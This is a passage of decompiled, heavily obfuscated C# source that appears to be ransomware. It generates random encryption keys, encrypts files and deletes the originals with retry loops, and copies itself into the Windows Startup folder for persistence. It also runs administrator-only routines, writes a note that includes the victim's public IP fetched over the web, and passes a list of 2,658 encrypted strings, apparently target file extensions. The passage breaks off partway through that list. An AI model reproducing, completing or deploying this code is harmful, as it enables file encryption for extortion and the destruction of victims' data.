								UMakmguwDziAz.nkwBxgmWNRASp(fWRwXzgCAjjaTG: (!qZXDIsTpDUXR) ? (kzxgomJEqSw ? UMakmguwDziAz.YfzRuKIVSlIggFhc(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UMakmguwDziAz.YfzRuKIVSlIggFhc(byte_, Encoding.ASCII.GetBytes(zlRieKkFzeh), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (kzxgomJEqSw ? lvPnQGmwQvcsCNgQ.RRycjAChOoCA(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : lvPnQGmwQvcsCNgQ.RRycjAChOoCA(byte_, Encoding.ASCII.GetBytes(zlRieKkFzeh), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), sNrLziMcVOrPcU: CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, afrhZVQdJhNaNnw: bytes);
							}
							else if (!kzxgomJEqSw)
							{
								fUfTmnKzHcpx.epfACCRTlqVGS(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, lpATBSWKaW, zlRieKkFzeh);
							}
							else
							{
								fUfTmnKzHcpx.epfACCRTlqVGS(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, lpATBSWKaW, text, bytes);
							}
						}
						else
						{
							if (SWTAoziGpJs)
							{
								smwDoAVKEY = oADcMioEnFbvkP + smwDoAVKEY;
							}
							string text2 = NZopcmHTCiMQzV.uWnqKeXVtnZBRi(32);
							string s2 = JsvGUDXDxegb.IZZvLHDYDcwVFv(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (smwDoAVKEY != getString_0(107117071))
							{
								if (!tJrulPsPKZ)
								{
									if (!kzxgomJEqSw)
									{
										NvWUfuaAWdwvhRC(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + smwDoAVKEY, cIuCDrbwXuOW);
									}
									else
									{
										NvWUfuaAWdwvhRC(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + smwDoAVKEY, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!kzxgomJEqSw)
										{
											kJPieacjYGSQl(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + smwDoAVKEY, cIuCDrbwXuOW);
										}
										else
										{
											kJPieacjYGSQl(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + smwDoAVKEY, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex6)
									{
										if (WUCUbinjeq)
										{
											try
											{
												File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107116801) + CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + getString_0(107117057) + ex6.Message + getString_0(107396273));
											}
											catch (Exception)
											{
											}
										}
										uKBVRzIpOhGoBvvo++;
										return;
									}
								}
							}
							else if (!tJrulPsPKZ)
							{
								if (!kzxgomJEqSw)
								{
									NvWUfuaAWdwvhRC(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + getString_0(107117066), cIuCDrbwXuOW);
								}
								else
								{
									NvWUfuaAWdwvhRC(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + getString_0(107117066), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!kzxgomJEqSw)
									{
										kJPieacjYGSQl(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, cIuCDrbwXuOW);
									}
									else
									{
										kJPieacjYGSQl(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex8)
								{
									if (WUCUbinjeq)
									{
										try
										{
											File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107116801) + CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + getString_0(107117057) + ex8.Message + getString_0(107396273));
										}
										catch (Exception)
										{
										}
									}
									uKBVRzIpOhGoBvvo++;
									return;
								}
							}
							if (kzxgomJEqSw)
							{
								if (smwDoAVKEY != getString_0(107117071))
								{
									cSThTETOguBcBoOS(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + smwDoAVKEY, bytes2);
								}
								else
								{
									cSThTETOguBcBoOS(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, bytes2);
								}
							}
						}
						end_IL_0656_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d56;
			IL_0d56:
			NkwuoikPHxefPg.Remove(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt);
		}

		static TxvmYnegcEEXP()
		{
			Strings.CreateGetStringDelegate(typeof(TxvmYnegcEEXP));
		}
	}

	private sealed class RVSIuUiBsAhsn
	{
		public string djYlbnwPOQOIhSe;

		public string sfUoAYwnvaf;

		public void _003CEncrypt2_003Eb__3e()
		{
			while (true)
			{
				try
				{
					File.Delete(djYlbnwPOQOIhSe);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3f()
		{
			while (true)
			{
				try
				{
					if (File.Exists(sfUoAYwnvaf))
					{
						File.Delete(sfUoAYwnvaf);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string DGMvhADQDhvvHBvW;

	public static byte[] cIuCDrbwXuOW;

	public static string OAyGmagMWpgoWAJCw;

	public static string pDpPfpDBIveZcfZ;

	public static List<string> JPTwqHSqmQofk;

	public static List<string> DlCUXajEIVUCD;

	public static string hWnwAmiBXnIpxX;

	public static string zlRieKkFzeh;

	public static string gEeUOBrkGDECGn;

	public static string KeylInOxQw;

	public static int fEVfCvbcNeE;

	public static string gZQfvzYpbFm;

	public static string sMWMPoSokZO;

	public static string HHYGaIuvqXbdu;

	public static string vYiyrVaAwx;

	public static string XZFGoOEkpQ;

	public static string lrADaDyiQGKc;

	public static string OzLZXBnRLVtJ;

	public static string PDmRqfuJsMB;

	public static List<string> aMmMDWbjtqwOY;

	public static List<string> LJCJcQbJapSHJR;

	public static string UjgMaWYCjvGuF;

	public static string votUdSXTMDqkx;

	public static string uuYpwOryzxx;

	public static List<string> iqVERQUhagNsiaC;

	public static string OSuDMxmnRmH;

	private static string mErkSlRuQmtdivX;

	public static string HjogaXQARCSKCJ;

	public static string TADhPTGUCTGsb;

	public static List<string> SjGhNlRInFwl;

	public static List<string> sYnLtmziONN;

	public static List<string> uFPbcFlZmuJ;

	public static List<string> tUzzZAFebr;

	public static string UGGmKsnoSN;

	public static List<string> ZOubOFvdOxx;

	public static List<string> nhZDyaCRzSAZ;

	public static string VrRnASDdgrSS;

	public static string qONUKLrZXBKbdHH;

	internal static DateTime WTgMoRUfuQyd;

	internal static DateTime cUsnkANVnGStpU;

	public static string mDoYpgRrDTVMHT;

	public static string lpATBSWKaW;

	public static string veSFSgAcXbYkfk;

	public static string TrfqnNPkKnxh;

	public static string HabWjBzXNZORcRD;

	public static string dRgBPstszwZYX;

	public static string GDLKdqRcwWU;

	public static string pAvlEUMGUOUVcdb;

	public static List<string> RrzUCivKfrsaJ;

	public static string ARdYTzaLyCQej;

	public static string zxDCvygXmLZs;

	public static string XSVbAbpxycYPjy;

	public static string TxXiGDwYtdTBy;

	public static string pHmzsZHyCjr;

	public static string dZCepYtuPbx;

	public static string bnwHpViNjnY;

	public static string wHIUGaHkbqZ;

	public static string NAuVcBiAFcWa;

	public static string NwYxCJSnEoN;

	public static string DfnXcorpnTcs;

	public static string VNwrzrCLJckBBg;

	public static string lqHDJpzUbIpmbQ;

	public static string seHvuluwnSdiPD;

	public static string FwhevPebYUTFN;

	public static string aMfKePxyxiok;

	public static string uUjbLARyBBdnV;

	public static string KRthpTyCiYU;

	public static string szncKbDkEgMPP;

	public static string kkipsSsrGYdH;

	public static string kMYmdrxKBXb;

	public static string VXrvhMAQaPAdjT;

	public static string CtBsjNEdQzWTtB;

	public static string XTLwWuXHos;

	public static string JsiIpuaiIxQx;

	public static string UHVSEIkpYf;

	public static string POQJbfIxsobkq;

	public static string sCuSkFLTfcaWr;

	public static string quhmMiARDLmR;

	public static string[] YFhYUCNshEdDAX;

	public static string uneEoMuaKwN;

	public static bool qZXDIsTpDUXR;

	public static string EZZKZrHTpoTaL;

	public static bool kzxgomJEqSw;

	public static bool AxeGoYXMvgRYQ;

	public static bool piVlfEbIoCs;

	public static bool gDuYPqPgoKOgrz;

	public static string YPtXSOBdFjEyjx;

	public static bool WUCUbinjeq;

	public static bool hrTgKngwQHtz;

	public static bool tHfxQsYaegO;

	public static bool gEajYrRefTMmPd;

	public static bool tJrulPsPKZ;

	public static string wtdIqahxTNLZTaxN;

	public static bool IZQwtTCtfut;

	public static Stopwatch DJgfUdbWObEcK;

	public static int uKBVRzIpOhGoBvvo;

	public static int jTlplcaVkMbxzj;

	public static bool SWTAoziGpJs;

	public static string oADcMioEnFbvkP;

	public static List<string> YCdnHJwvmqrsRsZ;

	public static List<string> MjWiSZYWGb;

	public static List<string> vASGoBEUZmAI;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		if (args.Length == 0 && bnwHpViNjnY == getString_0(107396882))
		{
			try
			{
				TwAzFXVMJYssEnB CS_0024_003C_003E8__locals0 = new TwAzFXVMJYssEnB();
				CS_0024_003C_003E8__locals0.PJmKEXqsFYiTo = Process.GetCurrentProcess().ProcessName;
				if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.PJmKEXqsFYiTo) > 1)
				{
					return;
				}
			}
			catch (Exception)
			{
			}
		}
		if (args.Length == 0 && bnwHpViNjnY == getString_0(107396882))
		{
			try
			{
				bupEMKxwvWhEl.lFeUuGHeFLxWl(mErkSlRuQmtdivX);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (UHVSEIkpYf == getString_0(107396909))
			{
				Thread thread = new Thread(eaZhSqnTlXGT.HgBHynpMEGWyT);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (HHYGaIuvqXbdu == getString_0(107396909))
		{
			Thread.Sleep(int.Parse(vYiyrVaAwx));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && GDLKdqRcwWU == getString_0(107396909))
		{
			try
			{
				zPCnkgziUrTTtuQ(ZszvXPTYjBtgjF(getString_0(107396904)));
			}
			catch
			{
			}
		}
		try
		{
			if (OzLZXBnRLVtJ == getString_0(107396909) && nECxmdxUaIxHGi.VlIYVfZlhsF())
			{
				new tATAganCkKkudc().RnPMoSyldZRy(bool_0: false);
				nECxmdxUaIxHGi.pSIleiwALmi();
			}
		}
		catch (Exception)
		{
		}
		if (votUdSXTMDqkx == getString_0(107396909) && nECxmdxUaIxHGi.VlIYVfZlhsF())
		{
			new tATAganCkKkudc().RnPMoSyldZRy(bool_0: false);
			new tATAganCkKkudc().rhDhFNxGVqt();
		}
		if (sMWMPoSokZO == getString_0(107396909))
		{
			XaRYieqIuZCz.fIYIDGewXMpyG();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396799);
			string text2 = text + Path.GetFileName(fileName);
			if (KeylInOxQw == getString_0(107396909) && fileName != text2)
			{
				Thread thread2 = new Thread(gGQDHtMXrExt);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (hWnwAmiBXnIpxX == getString_0(107396909) && mainModule != null && fileName != text2)
			{
				try
				{
					fEVfCvbcNeE = MpIjVOFgDVh(0, aMmMDWbjtqwOY.Count);
					File.Copy(fileName, text + aMmMDWbjtqwOY[fEVfCvbcNeE], overwrite: true);
					Process.Start(text + aMmMDWbjtqwOY[fEVfCvbcNeE]);
					VoAMpxkTccTxi();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (VrRnASDdgrSS == getString_0(107396909) && DateTime.Now < WTgMoRUfuQyd)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (qONUKLrZXBKbdHH == getString_0(107396909) && DateTime.Now > cUsnkANVnGStpU)
			{
				VoAMpxkTccTxi();
			}
		}
		catch
		{
		}
		NstGhHwsRy();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> source = sYnLtmziONN;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						DndsNVaSUbaYiXt(getString_0(107116986), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> sjGhNlRInFwl = SjGhNlRInFwl;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						DndsNVaSUbaYiXt(getString_0(107087116), string_0);
					};
				}
				Parallel.ForEach(sjGhNlRInFwl, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				List<string> source2 = uFPbcFlZmuJ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107116977)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				if (quhmMiARDLmR == getString_0(107396909))
				{
					string[] yFhYUCNshEdDAX = YFhYUCNshEdDAX;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107116977)), getString_0(107116952) + string_0 + getString_0(107116943));
						};
					}
					Parallel.ForEach(yFhYUCNshEdDAX, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				if (!aDRTZBCTUt().Contains(getString_0(107116681)))
				{
					KoKFpIzICEddc(UGGmKsnoSN);
				}
				else
				{
					List<string> source3 = tUzzZAFebr;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
						{
							DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(DqooNRqZwbOam(getString_0(107116970))), string_0);
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				List<string> zOubOFvdOxx = ZOubOFvdOxx;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107116913)), string_0);
					};
				}
				Parallel.ForEach(zOubOFvdOxx, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				List<string> source4 = nhZDyaCRzSAZ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
					{
						DndsNVaSUbaYiXt(getString_0(107116928), string_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && piVlfEbIoCs)
			{
				try
				{
					Thread thread4 = new Thread(ijYwfttZAkMpAn.jHwYscoSaxfn);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			DndsNVaSUbaYiXt(getString_0(107396762), ZszvXPTYjBtgjF(getString_0(107396781)));
			DndsNVaSUbaYiXt(getString_0(107396762), ZszvXPTYjBtgjF(getString_0(107397220)));
			DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107397163)), ZszvXPTYjBtgjF(getString_0(107397118)));
			DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107397163)), ZszvXPTYjBtgjF(getString_0(107396988)));
		}
		if (UjgMaWYCjvGuF == getString_0(107396909) && rgGfHrTNqBWHXWhv() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(dgstxCCDzAUD.WVjvADIUMQdIdWV);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = TADhPTGUCTGsb == getString_0(107396909);
		SecureString secureString = new SecureString();
		if (veSFSgAcXbYkfk == getString_0(107396882))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			zlRieKkFzeh = getString_0(107396366);
		}
		gEeUOBrkGDECGn = JsvGUDXDxegb.IZZvLHDYDcwVFv(hIWmgCgTMWgc(secureString));
		if (wHIUGaHkbqZ == getString_0(107396909))
		{
			XqMKMEVMiaP();
		}
		if (tHfxQsYaegO)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), wtdIqahxTNLZTaxN)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), wtdIqahxTNLZTaxN), string.Concat(ZszvXPTYjBtgjF(getString_0(107396321)), new WebClient().DownloadString(ZszvXPTYjBtgjF(getString_0(107396296))), getString_0(107396255), ZszvXPTYjBtgjF(getString_0(107396218)), DateTime.Now, getString_0(107396255), ZszvXPTYjBtgjF(getString_0(107396689)), gEeUOBrkGDECGn));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), wtdIqahxTNLZTaxN), getString_0(107396632) + gEeUOBrkGDECGn);
				}
			}
			catch (Exception ex7)
			{
				if (WUCUbinjeq)
				{
					try
					{
						File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107396603) + ex7.Message + getString_0(107396255));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		BgCwqaoXDaMc.tIOTIRlpToL(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), kkipsSsrGYdH), jyiyuULBUnIh(gEeUOBrkGDECGn), null, null, getString_0(107396586), getString_0(107396537), null);
		if (lqHDJpzUbIpmbQ == getString_0(107396909))
		{
			try
			{
				upjIfrWmXEYSDS();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			FLdjBVawwJEcO();
		}
		try
		{
			CxWJacaJapKKyRh(new string[1] { getString_0(107396552) }, new string[2658]
			{
				getString_0(107396543),
				getString_0(107396506),
				getString_0(107396501),
				getString_0(107396496),
				getString_0(107396523),
				getString_0(107396518),
				getString_0(107396513),
				getString_0(107396476),
				getString_0(107396471),
				getString_0(107396466),
				getString_0(107396493),
				getString_0(107396488),
				getString_0(107396483),
				getString_0(107395934),
				getString_0(107395929),
				getString_0(107395924),
				getString_0(107395919),
				getString_0(107395946),
				getString_0(107395937),
				getString_0(107395900),
				getString_0(107395895),
				getString_0(107395890),
				getString_0(107395913),
				getString_0(107395908),
				getString_0(107395903),
				getString_0(107395866),
				getString_0(107395861),
				getString_0(107395884),
				getString_0(107395879),
				getString_0(107395874),
				getString_0(107395837),
				getString_0(107395832),
				getString_0(107395827),
				getString_0(107395854),
				getString_0(107395845),
				getString_0(107395840),
				getString_0(107395803),
				getString_0(107395798),
				getString_0(107395793),
				getString_0(107395820),
				getString_0(107395815),
				getString_0(107395810),
				getString_0(107395769),
				getString_0(107395764),
				getString_0(107395759),
				getString_0(107395786),
				getString_0(107395781),
				getString_0(107395776),
				getString_0(107395735),
				getString_0(107395730),
				getString_0(107395757),
				getString_0(107395752),
				getString_0(107395747),
				getString_0(107395710),
				getString_0(107395705),
				getString_0(107395700),
				getString_0(107395695),
				getString_0(107395722),
				getString_0(107395717),
				getString_0(107396188),
				getString_0(107396183),
				getString_0(107396206),
				getString_0(107396201),
				getString_0(107396196),
				getString_0(107396191),
				getString_0(107396154),
				getString_0(107396149),
				getString_0(107396144),
				getString_0(107396171),
				getString_0(107396166),
				getString_0(107396125),
				getString_0(107396116),
				getString_0(107396139),
				getString_0(107396130),
				getString_0(107396093),
				getString_0(107396088),
				getString_0(107396083),
				getString_0(107396110),
				getString_0(107396105),
				getString_0(107396072),
				getString_0(107396027),
				getString_0(107396042),
				getString_0(107396033),
				getString_0(107395996),
				getString_0(107395991),
				getString_0(107395986),
				getString_0(107396013),
				getString_0(107396008),
				getString_0(107396003),
				getString_0(107395966),
				getString_0(107395961),
				getString_0(107395952),
				getString_0(107395975),
				getString_0(107395422),
				getString_0(107395417),
				getString_0(107395408),
				getString_0(107395435),
				getString_0(107395430),
				getString_0(107395425),
				getString_0(107395388),
				getString_0(107395383),
				getString_0(107395378),
				getString_0(107395401),
				getString_0(107395396),
				getString_0(107395391),
				getString_0(107395346),
				getString_0(107395373),
				getString_0(107395368),
				getString_0(107395359),
				getString_0(107395318),
				getString_0(107395337),
				getString_0(107395292),
				getString_0(107395279),
				getString_0(107395298),
				getString_0(107395253),
				getString_0(107395272),
				getString_0(107395227),
				getString_0(107395246),
				getString_0(107395233),
				getString_0(107395196),
				getString_0(107395191),
				getString_0(107395186),
				getString_0(107395209),
				getString_0(107395204),
				getString_0(107395199),
				getString_0(107395674),
				getString_0(107395669),
				getString_0(107395664),
				getString_0(107395691),
				getString_0(107395686),
				getString_0(107395681),
				getString_0(107395640),
				getString_0(107395631),
				getString_0(107395654),
				getString_0(107395613),
				getString_0(107395608),
				getString_0(107395603),
				getString_0(107395626),
				getString_0(107395617),
				getString_0(107395576),
				getString_0(107395571),
				getString_0(107395598),
				getString_0(107395593),
				getString_0(107395588),
				getString_0(107395583),
				getString_0(107395546),
				getString_0(107395537),
				getString_0(107395564),
				getString_0(107395559),
				getString_0(107395554),
				getString_0(107395513),
				getString_0(107395508),
				getString_0(107395503),
				getString_0(107395530),
				getString_0(107395525),
				getString_0(107395520),
				getString_0(107395483),
				getString_0(107395478),
				getString_0(107395473),
				getString_0(107395500),
				getString_0(107395495),
				getString_0(107395454),
				getString_0(107395449),
				getString_0(107395444),
				getString_0(107395467),
				getString_0(107395462),
				getString_0(107395457),
				getString_0(107394908),
				getString_0(107394899),
				getString_0(107394926),
				getString_0(107394917),
				getString_0(107394876),
				getString_0(107394871),
				getString_0(107394866),
				getString_0(107394893),
				getString_0(107394888),
				getString_0(107394883),
				getString_0(107394846),
				getString_0(107394841),
				getString_0(107394836),
				getString_0(107394831),
				getString_0(107394858),
				getString_0(107394853),
				getString_0(107394812),
				getString_0(107394803),
				getString_0(107394830),
				getString_0(107394825),
				getString_0(107394820),
				getString_0(107394779),
				getString_0(107394774),
				getString_0(107394769),
				getString_0(107394796),
				getString_0(107394787),
				getString_0(107394750),
				getString_0(107394741),
				getString_0(107394736),
				getString_0(107394759),
				getString_0(107394754),
				getString_0(107394713),
				getString_0(107394708),
				getString_0(107394703),
				getString_0(107394726),
				getString_0(107394721),
				getString_0(107394684),
				getString_0(107394679),
				getString_0(107394698),
				getString_0(107394693),
				getString_0(107395172),
				getString_0(107395167),
				getString_0(107395130),
				getString_0(107395125),
				getString_0(107395120),
				getString_0(107395147),
				getString_0(107395142),
				getString_0(107395137),
				getString_0(107395100),
				getString_0(107395095),
				getString_0(107395090),
				getString_0(107395117),
				getString_0(107395112),
				getString_0(107395103),
				getString_0(107395066),
				getString_0(107395061),
				getString_0(107395056),
				getString_0(107395083),
				getString_0(107395074),
				getString_0(107395033),
				getString_0(107395024),
				getString_0(107395051),
				getString_0(107395046),
				getString_0(107395041),
				getString_0(107395000),
				getString_0(107394991),
				getString_0(107395010),
				getString_0(107394973),
				getString_0(107394968),
				getString_0(107394959),
				getString_0(107394942),
				getString_0(107394933),
				getString_0(107394928),
				getString_0(107394955),
				getString_0(107394950),
				getString_0(107394945),
				getString_0(107394392),
				getString_0(107394387),
				getString_0(107394402),
				getString_0(107394365),
				getString_0(107394356),
				getString_0(107394351),
				getString_0(107394378),
				getString_0(107394373),
				getString_0(107394368),
				getString_0(107394331),
				getString_0(107394326),
				getString_0(107394321),
				getString_0(107394344),
				getString_0(107394339),
				getString_0(107394302),
				getString_0(107394293),
				getString_0(107394316),
				getString_0(107394307),
				getString_0(107394270),
				getString_0(107394265),
				getString_0(107394260),
				getString_0(107394255),
				getString_0(107394282),
				getString_0(107394273),
				getString_0(107394236),
				getString_0(107394231),
				getString_0(107394226),
				getString_0(107394253),
				getString_0(107394248),
				getString_0(107394239),
				getString_0(107394222),
				getString_0(107394217),
				getString_0(107394212),
				getString_0(107394207),
				getString_0(107394170),
				getString_0(107394165),
				getString_0(107394160),
				getString_0(107394187),
				getString_0(107394182),
				getString_0(107394177),
				getString_0(107394652),
				getString_0(107394647),
				getString_0(107394642),
				getString_0(107394669),
				getString_0(107394664),
				getString_0(107394659),
				getString_0(107394622),
				getString_0(107394613),
				getString_0(107394608),
				getString_0(107394631),
				getString_0(107394590),
				getString_0(107394585),
				getString_0(107394580),
				getString_0(107394575),
				getString_0(107394598),
				getString_0(107394593),
				getString_0(107394556),
				getString_0(107394551),
				getString_0(107394546),
				getString_0(107394573),
				getString_0(107394568),
				getString_0(107394559),
				getString_0(107394522),
				getString_0(107394513),
				getString_0(107394540),
				getString_0(107394535),
				getString_0(107394494),
				getString_0(107394489),
				getString_0(107394484),
				getString_0(107394479),
				getString_0(107394506),
				getString_0(107394501),
				getString_0(107394496),
				getString_0(107394459),
				getString_0(107394454),
				getString_0(107394477),
				getString_0(107394472),
				getString_0(107394467),
				getString_0(107394430),
				getString_0(107394445),
				getString_0(107394440),
				getString_0(107394435),
				getString_0(107393886),
				getString_0(107393881),
				getString_0(107393876),
				getString_0(107393871),
				getString_0(107393898),
				getString_0(107393893),
				getString_0(107393888),
				getString_0(107393851),
				getString_0(107393846),
				getString_0(107393869),
				getString_0(107393864),
				getString_0(107393855),
				getString_0(107393810),
				getString_0(107393837),
				getString_0(107393832),
				getString_0(107393827),
				getString_0(107393790),
				getString_0(107393785),
				getString_0(107393776),
				getString_0(107393803),
				getString_0(107393798),
				getString_0(107393793),
				getString_0(107393752),
				getString_0(107393747),
				getString_0(107393774),
				getString_0(107393765),
				getString_0(107393760),
				getString_0(107393715),
				getString_0(107393742),
				getString_0(107393733),
				getString_0(107393728),
				getString_0(107393687),
				getString_0(107393682),
				getString_0(107393709),
				getString_0(107393660),
				getString_0(107393651),
				getString_0(107393678),
				getString_0(107393669),
				getString_0(107393664),
				getString_0(107394139),
				getString_0(107394134),
				getString_0(107394129),
				getString_0(107394156),
				getString_0(107394151),
				getString_0(107394146),
				getString_0(107394105),
				getString_0(107394100),
				getString_0(107394095),
				getString_0(107394122),
				getString_0(107394117),
				getString_0(107394112),
				getString_0(107394071),
				getString_0(107394066),
				getString_0(107394093),
				getString_0(107394088),
				getString_0(107394083),
				getString_0(107394046),
				getString_0(107394037),
				getString_0(107394060),
				getString_0(107394051),
				getString_0(107394010),
				getString_0(107394005),
				getString_0(107394028),
				getString_0(107394019),
				getString_0(107393978),
				getString_0(107393969),
				getString_0(107393992),
				getString_0(107393987),
				getString_0(107393950),
				getString_0(107393941),
				getString_0(107393936),
				getString_0(107393959),
				getString_0(107393954),
				getString_0(107393917),
				getString_0(107393912),
				getString_0(107393907),
				getString_0(107393930),
				getString_0(107393925),
				getString_0(107393920),
				getString_0(107393371),
				getString_0(107393366),
				getString_0(107393361),
				getString_0(107393388),
				getString_0(107393335),
				getString_0(107393330),
				getString_0(107393357),
				getString_0(107393352),
				getString_0(107393347),
				getString_0(107393310),
				getString_0(107393305),
				getString_0(107393296),
				getString_0(107393319),
